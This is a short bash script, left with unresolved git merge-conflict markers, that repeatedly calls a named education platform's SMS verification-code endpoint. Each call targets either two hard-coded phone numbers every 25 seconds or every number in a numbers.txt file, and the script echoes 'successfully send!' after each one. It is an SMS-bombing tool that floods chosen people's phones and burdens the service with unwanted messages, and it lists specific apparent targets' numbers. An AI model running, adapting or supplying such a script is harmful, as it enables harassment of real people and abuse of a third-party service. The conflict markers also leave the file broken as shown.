<<<<<<< HEAD
for (( COUNTER=0; COUNTER<=$1-1; COUNTER+=1 )); do
    curl 'https://backend.eduon.uz/api-web/send-code/?phone=998902030700'
    curl 'https://backend.eduon.uz/api-web/send-code/?phone=998990670824'

    echo '\n'
    sleep 25
done



#url="https://backend.eduon.uz/api-web/send-code/?phone=998"
#count=0
#for (( COUNTER=0; COUNTER<=$1-1; COUNTER+=1 )); do
#    for i in $(cat numbers.txt); do
#        content="$(curl -s "$url/$i")"
#        curl "$url/$i"
#        # echo "$content" >> output.txt
#        count=$(($count+1))
#        echo "$count - $i - successfully send!"
#    done
#done
=======
# for (( COUNTER=0; COUNTER<=$1-1; COUNTER+=1 )); do
#     echo 'https://backend.eduon.uz/api-web/send-code/?phone=&type=registeration'
#     echo "\n\n"
# done



url="https://backend.eduon.uz/api-web/send-code/?phone=998"
count=0
for (( COUNTER=0; COUNTER<=$1-1; COUNTER+=1 )); do
    for i in $(cat numbers.txt); do
        content="$(curl -s "$url/$i")"
        curl "$url/$i"
        # echo "$content" >> output.txt
        count=$(($count+1))
        echo "$count - $i - successfully send!"
    done
done
>>>>>>> ff7b42c98364935c1d0a8d7bb8da4d0681b1a324


# https://ucell.uz/uz/useful_info/new_numbers_on_sale
